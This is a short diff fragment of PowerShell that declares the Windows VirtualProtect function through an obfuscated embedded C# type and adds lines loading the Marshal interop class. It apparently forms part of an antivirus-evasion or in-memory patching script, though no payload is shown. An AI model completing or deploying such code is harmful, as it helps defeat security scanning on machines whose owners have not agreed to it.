@@ -10,4 +10,5 @@ public class afrcv {
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-
+$7amada = [System.Runtime.InteropServices.Marshal]
+Add-Type -TypeDefinition $afrcv
